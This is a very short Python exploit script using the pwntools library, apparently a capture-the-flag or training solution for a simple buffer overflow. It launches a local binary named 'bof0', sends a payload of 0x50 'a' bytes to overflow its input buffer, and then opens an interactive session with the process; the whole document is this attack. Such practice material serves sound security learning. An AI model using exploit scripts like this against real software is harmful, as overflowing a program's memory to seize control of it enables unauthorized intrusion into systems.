from pwn import*

p = process("./bof0")

payload = b"a"*0x50

p.sendline(payload)
p.interactive()
